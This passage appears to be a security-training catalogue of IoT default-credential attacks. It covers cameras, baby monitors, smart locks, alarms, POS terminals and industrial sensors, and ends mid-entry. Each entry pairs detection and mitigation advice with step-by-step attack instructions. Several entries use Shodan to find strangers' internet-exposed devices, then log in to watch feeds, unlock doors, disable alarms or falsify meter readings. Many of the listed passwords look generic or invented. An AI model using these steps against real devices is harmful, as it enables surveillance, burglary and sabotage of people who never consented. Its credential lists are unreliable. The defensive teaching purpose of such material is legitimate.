# IoT / Embedded Devices Attacks

## Exploiting Default IP Camera Login

- **Attack Type**: Default Credentials Exploitation
- **Target**: IP Camera
- **Vulnerability**: Weak authentication (unchanged default login)
- **MITRE**: T1078
- **Impact**: Unauthorized surveillance access
- **Tools**: Web Browser, Shodan, Camera Default Cred List
- **Scenario**: An attacker gains access to an IP camera by using the default username and password, allowing them to watch or record video feeds.
- **Attack Steps**: Step 1: Use Shodan.io to search for publicly exposed IP cameras.Step 2: Filter by brand (e.g., “Hikvision”, “Dahua”) to identify camera models.Step 3: Pick an IP and open it in a web browser to access its login page.Step 4: Use default credentials from public lists (e.g., admin/admin, root/12345).Step 5: Upon successful login, browse live feed or device settings.Step 6: Take screenshots for documentation and exit without modifying anything (educational ethics).
- **Detection**: Monitor access logs, scan for exposed devices
- **Solution**: Change all default credentials, segment IoT from public internet
- **Tags**: IP camera, default login, unauthorized access

## Smart Plug Control via Default Web Panel

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Plug
- **Vulnerability**: Insecure web interface with default login
- **MITRE**: T0810
- **Impact**: Unintended control of power devices
- **Tools**: Web Browser, Fing App, Router Scan, Default Credentials DB
- **Scenario**: An attacker takes over a Wi-Fi smart plug to toggle it on/off remotely using its default admin interface.
- **Attack Steps**: Step 1: Connect to the same network as the smart plug (e.g., home Wi-Fi).Step 2: Use Fing or RouterScan to identify the smart plug’s local IP.Step 3: Open the IP in a browser to reach its control panel.Step 4: Enter default credentials (e.g., admin/admin) from online lists.Step 5: Control the plug remotely — turn it on/off.Step 6: Log the activity and explain potential implications (e.g., controlling heaters or appliances).
- **Detection**: Monitor local traffic for unknown access
- **Solution**: Change login and update firmware
- **Tags**: Smart plug, IoT home, Wi-Fi, power control

## Router Admin Page Exploitation

- **Attack Type**: Default Credentials Exploitation
- **Target**: Wi-Fi Router
- **Vulnerability**: Unchanged factory login credentials
- **MITRE**: T1078
- **Impact**: Network traffic redirection
- **Tools**: Web Browser, RouterScan, Default Credentials List
- **Scenario**: A test scenario where the attacker gains full control of a router using unchanged factory credentials, enabling DNS hijacking.
- **Attack Steps**: Step 1: Identify local IP of router (usually 192.168.0.1 or 192.168.1.1).Step 2: Open the IP in a browser to access the router’s admin panel.Step 3: Try common default creds (e.g., admin/admin or admin/password).Step 4: Once in, document access and DNS settings.Step 5: Simulate changing DNS to a malicious one (for demo only, do not apply).Step 6: Explain how attackers could redirect traffic to phishing sites.
- **Detection**: Check DNS logs, unauthorized logins
- **Solution**: Force password reset on first use, monitor router config
- **Tags**: router, DNS hijack, default credentials

## Exploiting Smart TV Default Credentials

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart TV
- **Vulnerability**: Open admin interface, no credential change
- **MITRE**: T1078
- **Impact**: Privacy breach, remote misuse
- **Tools**: Smart TV, Web Browser, Wireshark (optional), Default Credential List
- **Scenario**: An attacker accesses the admin interface of a smart TV to control apps, change display, or steal credentials stored in browsers.
- **Attack Steps**: Step 1: Discover smart TV IP address via router dashboard or LAN scanner.Step 2: Access the web admin panel using a browser (some TVs have one).Step 3: Attempt default login combinations (e.g., admin/0000 or user/password).Step 4: Simulate accessing browser history or launching YouTube remotely.Step 5: Log any changes and demonstrate potential privacy risks.Step 6: End simulation by logging out and resetting device.
- **Detection**: Unusual remote access logs
- **Solution**: Set unique strong password, disable remote admin if unused
- **Tags**: Smart TV, admin access, LAN, UI abuse

## DVR Exploitation with Default Root Login

- **Attack Type**: Default Credentials Exploitation
- **Target**: DVR (Digital Video Recorder)
- **Vulnerability**: Telnet with default root password
- **MITRE**: T0810
- **Impact**: Disable security footage, surveillance evasion
- **Tools**: Telnet, PuTTY, Default Credentials List
- **Scenario**: Exploiting a Digital Video Recorder's (DVR) telnet service using default root credentials to access surveillance footage or tamper with recording schedules.
- **Attack Steps**: Step 1: Scan network for open telnet ports (port 23) using Nmap.Step 2: Identify IPs of DVR devices from scan results.Step 3: Use PuTTY or telnet client to connect to the DVR.Step 4: Attempt login with default root credentials (e.g., root/123456).Step 5: Upon access, simulate reading config files or schedules.Step 6: Demonstrate how an attacker could disable camera recording during intrusion (educational demo only).
- **Detection**: Monitor port 23 connections, use SIEM for telnet alerts
- **Solution**: Disable telnet, use SSH, enforce password changes
- **Tags**: DVR, root login, surveillance bypass

## Smart Light Bulb Exploitation via Default Mobile App Credentials

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Light Bulb
- **Vulnerability**: Default cloud/mobile credentials, no MFA
- **MITRE**: T1078
- **Impact**: Physical disruption, signal abuse
- **Tools**: Mobile App, Packet Capture Tool (e.g., Wireshark), Shodan, Default Credential List
- **Scenario**: Attacker gains control of smart lighting system due to unchanged default cloud-linked credentials in the companion mobile app.
- **Attack Steps**: Step 1: Identify smart bulb brand and install its official mobile app (e.g., Tuya, TP-Link).Step 2: Create a new user account with the default credentials (e.g., user: admin / pass: 1234) used in demo units (Tool: Manufacturer credential list).Step 3: Use the app to discover bulbs on the LAN or linked via cloud (Tool: Smart App's device discovery).Step 4: Interact with the bulb — change brightness, color, and schedules (Tool: Mobile App).Step 5: Perform a packet capture while using the app (Tool: Wireshark) to observe unencrypted traffic.Step 6: Log actions and highlight how attackers can manipulate devices for harassment or signaling (e.g., blinking lights).
- **Detection**: Monitor app usage and cloud access logs
- **Solution**: Enforce unique device pairing keys and force MFA
- **Tags**: Smart bulb, default mobile creds, LAN, cloud

## Exploiting Baby Monitor Over LAN via Web Panel Defaults

- **Attack Type**: Default Credentials Exploitation
- **Target**: Baby Monitor
- **Vulnerability**: Default login credentials
- **MITRE**: T1078
- **Impact**: Eavesdropping, privacy breach
- **Tools**: Fing App, Web Browser, Default Password Lists
- **Scenario**: An attacker accesses a baby monitor’s video/audio feed via its unsecured web interface using factory-set credentials.
- **Attack Steps**: Step 1: Scan the local network using Fing to find IoT devices and identify baby monitor by MAC vendor (Tool: Fing).Step 2: Use a browser to navigate to the monitor’s IP and access its web interface (Tool: Chrome/Firefox).Step 3: Try known default logins (admin/admin, user/1234) from manufacturer lists.Step 4: Access video/audio feed and settings dashboard.Step 5: Demonstrate the ability to control volume or disable audio.Step 6: End simulation by logging out and recommending hardening steps.
- **Detection**: Monitor LAN traffic for device access
- **Solution**: Change login credentials, use firewall rules
- **Tags**: baby monitor, privacy, audio exploit

## Unauthorized Access to Smart Garage Controller

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Garage Door
- **Vulnerability**: Default web panel login
- **MITRE**: T0810
- **Impact**: Physical intrusion, remote garage opening
- **Tools**: Web Browser, Burp Suite (optional), Default Cred DB
- **Scenario**: Attacker opens a smart garage door remotely by logging into the controller with unchanged default credentials.
- **Attack Steps**: Step 1: Identify garage controller IP from network scan (Tool: Advanced IP Scanner).Step 2: Open its local web interface in browser.Step 3: Use known default username/password (e.g., admin/1234 or user/user).Step 4: Access control panel showing door open/close options.Step 5: Simulate clicking 'Open' button to trigger action.Step 6: Capture HTTP request using Burp Suite (optional) and highlight security flaws (e.g., no session token).
- **Detection**: Monitor garage device logins
- **Solution**: Mandatory login change on first use
- **Tags**: garage, physical access, home IoT

## Telnet Access to Industrial IoT Sensor

- **Attack Type**: Default Credentials Exploitation
- **Target**: Industrial IoT Sensor
- **Vulnerability**: Telnet default root password
- **MITRE**: T1078
- **Impact**: Production disruption, sensor manipulation
- **Tools**: Nmap, Telnet Client, Default Cred List
- **Scenario**: Telnet port left open on industrial IoT sensors allows attackers full shell access using factory root credentials.
- **Attack Steps**: Step 1: Run Nmap scan on industrial subnet to find devices with port 23 open.Step 2: Identify IPs labeled as “PLC” or “sensor controller” based on banner grabbing.Step 3: Use telnet to connect (Tool: PuTTY or built-in telnet).Step 4: Enter default root credentials (root: root or root: admin).Step 5: List running processes, configs, and simulate device shutdown.Step 6: Educate participants on the severity of remote shell access to OT devices.
- **Detection**: Monitor network for telnet sessions
- **Solution**: Disable telnet, use SSH and access control
- **Tags**: telnet, OT, IIoT, shell access

## Exploiting Fitness Tracker via Web Portal Defaults

- **Attack Type**: Default Credentials Exploitation
- **Target**: Fitness Tracker
- **Vulnerability**: Shared cloud login, unchanged admin creds
- **MITRE**: T1078
- **Impact**: Data breach of health metrics
- **Tools**: Browser, Default Password Lists, Burp Suite (optional)
- **Scenario**: A shared web portal for fitness tracker devices is left with default admin logins, exposing all user data synced online.
- **Attack Steps**: Step 1: Register at the fitness tracker’s cloud portal using default admin login (Tool: Browser + Default List).Step 2: Access dashboards containing synced user info like steps, heart rate.Step 3: Navigate through user list and simulate accessing multiple profiles.Step 4: Use Burp Suite to inspect how login sessions are handled.Step 5: Report findings and illustrate how sensitive health data can be breached.Step 6: Log out and suggest enforcing password policies.
- **Detection**: Monitor portal logins, flag admin access
- **Solution**: Enforce user-specific login & remove shared access
- **Tags**: fitness, health, cloud portal

## Hacking a Smart Refrigerator Using Default SSH Access

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Refrigerator
- **Vulnerability**: SSH access with default root login
- **MITRE**: T1078
- **Impact**: Appliance malfunction, remote misuse
- **Tools**: Nmap, SSH Client (PuTTY), Default SSH Login List
- **Scenario**: A smart refrigerator running a lightweight Linux OS exposes SSH, which is accessible using factory root credentials.
- **Attack Steps**: Step 1: Scan for smart appliances on LAN using Nmap.Step 2: Identify a device exposing port 22 (SSH) and detect it as refrigerator via MAC prefix.Step 3: Use PuTTY to connect via SSH.Step 4: Enter default credentials (e.g., root/samsung123).Step 5: Access shell, demonstrate ability to view files or crash temperature module.Step 6: Document impact and disconnect.
- **Detection**: Monitor SSH logins on home network
- **Solution**: Disable SSH, use firewall rules
- **Tags**: smart fridge, linux, SSH, embedded

## Smart Doorbell Video Stream Access

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Doorbell
- **Vulnerability**: Default user login (cloud-based)
- **MITRE**: T1078
- **Impact**: Privacy invasion, recon
- **Tools**: Vendor Mobile App, Browser, Shodan, Default Cred Lists
- **Scenario**: Attacker gains access to doorbell's camera feed by entering default login on the vendor’s mobile app or web interface.
- **Attack Steps**: Step 1: Use Shodan to locate exposed doorbells by vendor name.Step 2: Launch app or open IP in browser.Step 3: Use vendor’s default login (e.g., guest/guest).Step 4: Access real-time video feed or stored clips.Step 5: Highlight privacy implications and record steps for audit log.Step 6: Simulate breach report and logout.
- **Detection**: Monitor external IP access logs
- **Solution**: Force password change, encrypt video feed
- **Tags**: doorbell, camera, guest access

## Smart Thermostat Admin Panel Compromise

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Thermostat
- **Vulnerability**: Open admin panel with default login
- **MITRE**: T0810
- **Impact**: Environment control, power abuse
- **Tools**: Web Browser, Credential List, IP Scanner
- **Scenario**: Unauthorized user changes temperature and schedule via browser-accessed admin panel.
- **Attack Steps**: Step 1: Discover IP of thermostat on local network using IP Scanner.Step 2: Open browser and navigate to its panel.Step 3: Try common default credentials (admin/admin, installer/0000).Step 4: Modify schedule to disable heating/cooling.Step 5: Simulate changing firmware update settings.Step 6: Educate how tampering with HVAC can be used maliciously.
- **Detection**: Thermostat access log
- **Solution**: Replace all default passwords, restrict local access
- **Tags**: thermostat, HVAC, admin interface

## Exploiting Smart Lock via Default Installer Portal

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Lock
- **Vulnerability**: Central installer account with default login
- **MITRE**: T1078
- **Impact**: Physical entry to buildings
- **Tools**: Browser, Installer Portal, Default Password Lists
- **Scenario**: A remote management portal for smart locks used by installers is left with default login, exposing multiple homes.
- **Attack Steps**: Step 1: Locate installer portal URL via public documentation or web search.Step 2: Login using factory credentials (e.g., installer/installer123).Step 3: Access dashboard showing lock status of several properties.Step 4: Simulate unlocking one door via panel.Step 5: Log actions and audit trail for educational report.Step 6: End simulation and logout.
- **Detection**: Monitor access logs, use OTP for installers
- **Solution**: Enforce tokenized onboarding per property
- **Tags**: smart lock, installer, dashboard access

## Default Credentials in Smart Irrigation System

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Irrigation Controller
- **Vulnerability**: Exposed web interface with default login
- **MITRE**: T0810
- **Impact**: Environmental damage, utility abuse
- **Tools**: Browser, Shodan, Default Credentials DB
- **Scenario**: A smart irrigation controller exposed to internet is accessible via browser due to default login settings.
- **Attack Steps**: Step 1: Search Shodan for smart irrigation controllers (e.g., “RainMachine”, “Hydrawise”).Step 2: Pick an exposed IP and access via browser.Step 3: Use known default creds from manual (admin/admin or user/1234).Step 4: Simulate changing watering schedule and soil sensor thresholds.Step 5: Log environmental impact of misuse.Step 6: Exit simulation, demonstrate how such access can cause water wastage or crop loss.
- **Detection**: Monitor access attempts from foreign IPs
- **Solution**: Change creds, restrict panel to VPN users
- **Tags**: irrigation, agriculture, exposed IP

## Unauthorized Control of Smart Coffee Machine

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Coffee Machine
- **Vulnerability**: Default admin interface login
- **MITRE**: T1078
- **Impact**: Device misuse, energy waste
- **Tools**: Browser, Wireshark, Default Credentials List
- **Scenario**: An attacker remotely starts brewing coffee or alters settings using factory credentials on the coffee machine’s web interface.
- **Attack Steps**: Step 1: Identify the IP of the coffee machine on LAN using Advanced IP Scanner.Step 2: Access the coffee machine's web interface through a browser (e.g., http://192.168.1.100).Step 3: Try default credentials (e.g., admin/admin or user/0000) from public lists.Step 4: Once inside, simulate modifying temperature, schedule brewing, or manually start the coffee cycle (Tool: Browser control panel).Step 5: Run Wireshark during interaction to observe cleartext traffic.Step 6: Log all actions and explain risks of device misuse, including potential fire hazard or resource waste.
- **Detection**: Monitor abnormal schedule changes
- **Solution**: Force unique credentials and encrypt traffic
- **Tags**: coffee machine, smart appliance, abuse

## Exploiting Smart Speaker via Voice Command History Panel

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Speaker
- **Vulnerability**: Web portal with unchanged login
- **MITRE**: T1078
- **Impact**: Privacy invasion, intelligence gathering
- **Tools**: Browser, Burp Suite, Default Credential DB
- **Scenario**: Default credentials allow unauthorized access to smart speaker's web dashboard, exposing recorded voice commands.
- **Attack Steps**: Step 1: Access the speaker’s IP from the router’s admin page.Step 2: Open the speaker’s admin web interface.Step 3: Enter default login (e.g., admin/1234).Step 4: Navigate to stored voice logs and playback history (Tool: Admin panel).Step 5: Use Burp Suite to intercept HTTP traffic and inspect API endpoints.Step 6: Report ability to listen to voice commands and log possible privacy implications.
- **Detection**: Detect access to audio log APIs
- **Solution**: Mandatory login changes; encrypt logs
- **Tags**: smart speaker, voice history, privacy

## Surveillance Drone Hijack via Default Wi-Fi Access

- **Attack Type**: Default Credentials Exploitation
- **Target**: Surveillance Drone
- **Vulnerability**: Default Wi-Fi credentials
- **MITRE**: T0810
- **Impact**: Drone hijacking, spying, crash risk
- **Tools**: Mobile App, Fing, Wi-Fi Analyzer, Default Wi-Fi Passwords
- **Scenario**: A surveillance drone’s Wi-Fi SSID uses a known pattern and default password, allowing attackers to hijack it via the mobile app.
- **Attack Steps**: Step 1: Scan for drone SSIDs using Wi-Fi Analyzer (e.g., “Parrot_123456”).Step 2: Connect to the drone’s hotspot using factory default Wi-Fi password (e.g., 12345678).Step 3: Open the vendor’s app and control the drone without login prompt.Step 4: Demonstrate live camera feed and movement commands.Step 5: Log commands issued and video access.Step 6: Explain how default Wi-Fi passwords pose serious control risks.
- **Detection**: Monitor wireless clients connected to drone
- **Solution**: Enforce WPA2 key change and app authentication
- **Tags**: drone, Wi-Fi hijack, hotspot

## Remote Exploitation of Smart Fish Tank System

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Fish Tank Controller
- **Vulnerability**: Internet-exposed admin with default login
- **MITRE**: T1078
- **Impact**: Life-threatening misconfiguration
- **Tools**: Browser, Shodan, Default Credential List
- **Scenario**: Attackers use default login on internet-exposed fish tank controller to alter temperature, lights, and feeding schedule.
- **Attack Steps**: Step 1: Use Shodan to search for exposed smart tank interfaces (e.g., search “Aquarium Controller port:80”).Step 2: Open one exposed IP in browser.Step 3: Try factory credentials (admin/aquarium123).Step 4: Access dashboard and change temperature to extreme values.Step 5: Simulate disabling filters or overfeeding.Step 6: Explain risks to aquatic life due to lack of access control.
- **Detection**: Monitor cloud dashboard usage patterns
- **Solution**: Password enforcement, restrict public access
- **Tags**: fish tank, default, cloud access

## POS Device Panel Access via Default Installer Credentials

- **Attack Type**: Default Credentials Exploitation
- **Target**: POS Terminal
- **Vulnerability**: Installer panel with default login
- **MITRE**: T1078
- **Impact**: Financial theft, inventory leak
- **Tools**: Browser, Credential Dump Sites, Network Scanner
- **Scenario**: A Point of Sale (POS) terminal used in a small shop is accessed by an attacker via default installer web login, exposing transactions.
- **Attack Steps**: Step 1: Identify POS terminal IP using a local network scanner.Step 2: Visit its browser panel via http://POS-IP/login.Step 3: Enter default installer credentials (installer/install123).Step 4: Simulate accessing transaction logs and inventory.Step 5: Export a list of purchases for demonstration.Step 6: Show how sales data and card swipe logs may be harvested.
- **Detection**: POS logs access monitoring
- **Solution**: Force credential change during installation
- **Tags**: POS, default login, transaction theft

## Smart Air Purifier Control Panel Exploitation

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Air Purifier
- **Vulnerability**: Local admin page with default login
- **MITRE**: T0810
- **Impact**: Air quality reduction, health impact
- **Tools**: Web Browser, IP Scanner, Default Credentials DB
- **Scenario**: Unchanged login on a web-accessible purifier allows an attacker to disable filters or alter speed, reducing air quality.
- **Attack Steps**: Step 1: Identify smart purifier IP using IP scanner (e.g., Angry IP Scanner).Step 2: Visit the purifier admin panel on browser.Step 3: Enter default credentials (admin/air1234).Step 4: Simulate turning off HEPA filter or scheduling erratic cycles.Step 5: Highlight health impact of reduced purification.Step 6: Log changes and explain defense strategies.
- **Detection**: Monitor for sudden config changes
- **Solution**: Enforce credential setup and secure OTA
- **Tags**: air purifier, HVAC, login flaw

## Exploiting Smart Energy Meter with Default Admin

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Energy Meter
- **Vulnerability**: Admin panel with factory password
- **MITRE**: T0810
- **Impact**: Billing fraud, masking illegal use
- **Tools**: Web Browser, Shodan, Default Admin Logins
- **Scenario**: An attacker accesses a smart energy meter's interface with unchanged login and modifies usage reports.
- **Attack Steps**: Step 1: Use Shodan to locate smart meter with open HTTP interface.Step 2: Log in using default credentials (admin/energy123).Step 3: Modify meter readings or reset logs.Step 4: Export falsified usage report as PDF.Step 5: Explain potential for fraud or billing manipulation.Step 6: Demonstrate how attackers can mask real energy theft.
- **Detection**: Compare usage logs with sensor readings
- **Solution**: Disable public access, 2FA on portal
- **Tags**: energy, billing, meter exploit

## Internet Radio Compromise via Default Config Portal

- **Attack Type**: Default Credentials Exploitation
- **Target**: Internet Radio Device
- **Vulnerability**: Default admin interface access
- **MITRE**: T0810
- **Impact**: Audio harassment, psychological ops
- **Tools**: Browser, IP Scanner, Default Credentials List
- **Scenario**: Radio receiver allows streaming control via web portal left on default credentials.
- **Attack Steps**: Step 1: Locate the internet radio device IP from local network.Step 2: Open admin portal in browser (http://IP/admin).Step 3: Use default login (e.g., admin/music123).Step 4: Change station, volume, or schedule.Step 5: Simulate adding malicious stream URL.Step 6: Educate how attackers could inject propaganda or loud noise loops.
- **Detection**: Alert on custom station URLs
- **Solution**: Change login, whitelist stream sources
- **Tags**: radio, audio injection, speaker

## Exploiting Smart Pet Feeder Web UI

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Pet Feeder
- **Vulnerability**: Web dashboard with default login
- **MITRE**: T0810
- **Impact**: Animal abuse, schedule disruption
- **Tools**: Browser, Default Password DB, Fing App
- **Scenario**: An attacker gains access to a pet feeder and modifies feeding cycles to overfeed or starve the pet.
- **Attack Steps**: Step 1: Identify pet feeder IP using Fing on LAN.Step 2: Visit the device’s web UI.Step 3: Try default credentials (admin/pet123 or root/feedme).Step 4: Access feeding schedule and alter intervals.Step 5: Demonstrate triggering manual feed.Step 6: Explain how attackers can use this for animal harm or remote control.
- **Detection**: Monitor feeding logs, tamper alarms
- **Solution**: Change default login and enable app 2FA
- **Tags**: pet feeder, animal IoT, food automation

## HVAC System Compromise in Small Office

- **Attack Type**: Default Credentials Exploitation
- **Target**: HVAC IoT Controller
- **Vulnerability**: Web panel with unchanged login
- **MITRE**: T0810
- **Impact**: Equipment damage, productivity loss
- **Tools**: Web Browser, Nmap, Default Login Sheet
- **Scenario**: A building's HVAC is accessible via web admin panel left on default login, allowing attackers to turn off A/C remotely.
- **Attack Steps**: Step 1: Scan the office network using Nmap to find open ports (80/443).Step 2: Identify the HVAC system from the scan results.Step 3: Open browser and log in using default credentials (admin/HVAC123).Step 4: Simulate changing temperature to extreme hot/cold.Step 5: Alter fan speed or disable emergency cooling.Step 6: Highlight possible productivity and hardware damage risks.
- **Detection**: Monitor extreme setpoint changes
- **Solution**: Force credential change, restrict access
- **Tags**: HVAC, building IoT, temperature abuse

## Default Credential Exploitation on Smart Toaster

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Toaster
- **Vulnerability**: Exposed admin panel with default login
- **MITRE**: T1078
- **Impact**: Fire hazard, home safety risk
- **Tools**: Browser, Fing App, Default Credentials DB
- **Scenario**: The smart toaster connects to Wi-Fi and exposes a control interface with factory credentials, allowing remote control of heating elements.
- **Attack Steps**: Step 1: Use Fing app to identify smart toaster IP on local Wi-Fi.Step 2: Enter toaster IP in browser (e.g., http://192.168.0.105).Step 3: Try known default login combos like admin/toast123.Step 4: Access control panel to view heating settings.Step 5: Simulate setting max toasting time and start toasting remotely.Step 6: Explain the risks (e.g., fire hazard, food waste).
- **Detection**: Monitor high temp commands
- **Solution**: Disable remote by default, enforce credential change
- **Tags**: toaster, smart appliance, home safety

## Unauthorized Remote Control of Smart Ceiling Fan

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Ceiling Fan
- **Vulnerability**: Default installer credentials
- **MITRE**: T0810
- **Impact**: Environmental disruption, harassment
- **Tools**: Browser, Router Interface, Default Login Sheet
- **Scenario**: A smart ceiling fan allows web access with default installer credentials that attackers can use to disrupt airflow or create distractions.
- **Attack Steps**: Step 1: Access router dashboard to find the IP of the fan.Step 2: Open the fan’s control panel via browser.Step 3: Enter default credentials (e.g., installer/installfan).Step 4: Change speed settings or enable oscillation randomly.Step 5: Simulate schedule manipulation (e.g., turning fan on/off at night).Step 6: Discuss how such control may cause discomfort or alarm.
- **Detection**: Unusual schedule change logs
- **Solution**: Setup unique login during installation
- **Tags**: fan, oscillation, home IoT

## Hijacking Smart Sprinkler System Over Cloud

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Sprinkler
- **Vulnerability**: Cloud account with default login
- **MITRE**: T1078
- **Impact**: Resource abuse (water), sabotage
- **Tools**: Web Browser, Shodan, Vendor App, Credential DB
- **Scenario**: Attacker logs into a cloud-linked smart sprinkler system with default account credentials and triggers watering remotely.
- **Attack Steps**: Step 1: Search Shodan for known cloud IPs of sprinkler brand (e.g., RainLink).Step 2: Try logging into web/cloud app with default user credentials (user/user123).Step 3: Access zone control panel and trigger sprinklers.Step 4: Change timing schedule to simulate overwatering.Step 5: Record possible water wastage and impact on landscape.Step 6: Log out and demonstrate need for credential hardening.
- **Detection**: Detect off-hours water usage
- **Solution**: Enforce password rotation, limit cloud access
- **Tags**: sprinkler, water misuse, overwatering

## Smart Window Shades Control via Default Credentials

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Window Shades
- **Vulnerability**: Web UI with installer login
- **MITRE**: T0810
- **Impact**: Privacy invasion
- **Tools**: Browser, Nmap, Default Credential Database
- **Scenario**: Smart window shades accessible through browser can be fully controlled using default installer credentials.
- **Attack Steps**: Step 1: Scan LAN for port 8080 using Nmap to find shade controller.Step 2: Identify IP address and open web UI in browser.Step 3: Enter installer login (e.g., admin/shade123).Step 4: Simulate opening/closing blinds on a schedule.Step 5: Explain physical privacy implications (e.g., attacker peeking into room).Step 6: Exit session and recommend security measures.
- **Detection**: Monitor shade schedule for anomalies
- **Solution**: Change password, restrict to local LAN only
- **Tags**: blinds, smart home, privacy control

## Unauthorized Access to Smart Kettle via Bluetooth & Default PIN

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Kettle
- **Vulnerability**: Bluetooth pairing with default PIN
- **MITRE**: T0810
- **Impact**: Boiling hazard, energy misuse
- **Tools**: Bluetooth Scanner (e.g., LightBlue), Vendor App
- **Scenario**: Smart kettle uses Bluetooth pairing with default PIN (0000/1234), allowing attacker to connect nearby and trigger boiling.
- **Attack Steps**: Step 1: Scan for Bluetooth devices using LightBlue app.Step 2: Identify kettle by vendor name (e.g., SmartKettle_01).Step 3: Attempt pairing using default PIN (0000).Step 4: Launch vendor app and control kettle (e.g., boil water remotely).Step 5: Repeat boil cycle to simulate energy waste.Step 6: Explain physical risks and need for Bluetooth PIN changes.
- **Detection**: Detect repeat pairing attempts
- **Solution**: Enforce PIN change during setup
- **Tags**: kettle, Bluetooth hack, pairing flaw

## Exploiting Electric Vehicle Charger Over LAN

- **Attack Type**: Default Credentials Exploitation
- **Target**: EV Charger
- **Vulnerability**: Admin panel with unchanged login
- **MITRE**: T0810
- **Impact**: Energy theft, user disruption
- **Tools**: IP Scanner, Browser, Manufacturer Default Login List
- **Scenario**: Electric car charger connected to LAN can be accessed using default login, enabling remote starting or stopping of charge.
- **Attack Steps**: Step 1: Scan local IP range using Advanced IP Scanner.Step 2: Access charger’s interface via browser.Step 3: Login using factory credentials (admin/charge123).Step 4: Simulate turning off charging mid-cycle.Step 5: View power usage stats and download reports.Step 6: Explain how such tampering can delay charging or cause energy theft.
- **Detection**: Detect unexpected remote commands
- **Solution**: Enforce password setup at first use
- **Tags**: EV charger, electric car, LAN attack

## Default Credential Attack on Smart Alarm System

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Alarm System
- **Vulnerability**: Cloud portal with default admin
- **MITRE**: T1078
- **Impact**: Burglary, sensor disablement
- **Tools**: Shodan, Browser, Default Credentials DB
- **Scenario**: Smart alarm system has default cloud dashboard login that attackers use to disable motion detection.
- **Attack Steps**: Step 1: Use Shodan to search for exposed alarm system cloud interfaces.Step 2: Open one of the URLs in browser.Step 3: Use vendor’s default credentials (admin/alarm123).Step 4: Simulate disabling the motion sensor or arming/disarming remotely.Step 5: Log unauthorized access and explain potential burglary risks.Step 6: Show how many IoT alarms lack enforced password rotation.
- **Detection**: Alert on off-hours deactivation
- **Solution**: Require password update after registration
- **Tags**: alarm, burglary risk, motion sensor

## Hot Tub Control via Default Credentials

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Hot Tub
- **Vulnerability**: Local web panel with default login
- **MITRE**: T0810
- **Impact**: Scalding hazard, water waste
- **Tools**: Browser, IP Scanner, Default Login List
- **Scenario**: Smart hot tubs expose remote access dashboards with default logins, allowing attackers to change temperature settings.
- **Attack Steps**: Step 1: Scan network with Fing or Nmap to detect hot tub controller.Step 2: Open controller page on browser.Step 3: Try default credentials (e.g., admin/hottub123).Step 4: Simulate increasing temperature to maximum.Step 5: Change timer settings and simulate water jet activation.Step 6: Log actions and discuss safety hazards.
- **Detection**: Monitor config changes
- **Solution**: Secure access, temperature limits
- **Tags**: hot tub, smart pool, water IoT

## GPS Tracker Tampering via Default Web Interface

- **Attack Type**: Default Credentials Exploitation
- **Target**: GPS Tracker
- **Vulnerability**: Unchanged web login credentials
- **MITRE**: T0810
- **Impact**: Location spoofing, theft risk
- **Tools**: Browser, IP Scanner, Default Credential Sheet
- **Scenario**: Vehicle GPS trackers have browser-based interfaces using default credentials, letting attackers change reporting intervals or disable tracking.
- **Attack Steps**: Step 1: Locate GPS tracker IP on LAN using scanner.Step 2: Open the device's web UI (often port 8080).Step 3: Enter default login (e.g., admin/gps1234).Step 4: Simulate disabling live tracking or reducing update rate.Step 5: Explain how stolen vehicles can bypass tracking.Step 6: Document steps and exit.
- **Detection**: Track heartbeat report delays
- **Solution**: Enforce password change, geofence alerts
- **Tags**: GPS, tracker, vehicle IoT

## Smart Trash Bin Control Panel Abuse

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Trash Bin
- **Vulnerability**: Web interface with unchanged login
- **MITRE**: T0810
- **Impact**: Operational disruption
- **Tools**: Browser, Shodan, Default Login Sheet
- **Scenario**: City smart bins use a web panel to control lid openings and compaction cycles, which attackers access via default credentials.
- **Attack Steps**: Step 1: Use Shodan to search for smart bins (e.g., keyword: “smartbin status”).Step 2: Access the bin dashboard via public IP.Step 3: Try default credentials (admin/bin123).Step 4: Simulate triggering compactor remotely.Step 5: Schedule fake maintenance alerts.Step 6: Discuss disruption to waste management.
- **Detection**: Detect excessive compaction logs
- **Solution**: Unique installer password, restrict WAN
- **Tags**: smart bin, public IoT, municipal device

## Accessing a Smart Mirror Using Default Login

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Mirror
- **Vulnerability**: Easy-to-guess default login
- **MITRE**: T1078
- **Impact**: Misinformation, privacy breach
- **Tools**: Smartphone, Browser, IP Scanner App (like Fing), Default Password List
- **Scenario**: A smart mirror that shows weather, news, and calendar can be accessed from a web page using the factory-set username and password.
- **Attack Steps**: Step 1: Connect your phone to the same Wi-Fi as the smart mirror.Step 2: Open Fing app and find a device named something like “SmartMirror”.Step 3: Copy the IP address (like 192.168.0.105) and paste it in your browser.Step 4: A login page opens. Try default logins like admin/admin or user/1234.Step 5: If it works, now you can change what the mirror displays.Step 6: Log actions and explain how an attacker could use this to trick someone (e.g., showing false messages).
- **Detection**: Logs from mirror’s admin panel
- **Solution**: Change login immediately after setup
- **Tags**: smart mirror, UI trick, home gadget

## Breaking Into a Smart Intercom System Using Factory Credentials

- **Attack Type**: Default Credentials Exploitation
- **Target**: Smart Intercom System
- **Vulnerability**: Web panel with unchanged login
- **MITRE**: T0810
- **Impact**: Harassment, social engineering
- **Tools**: Laptop, Browser, Default Password Sheet
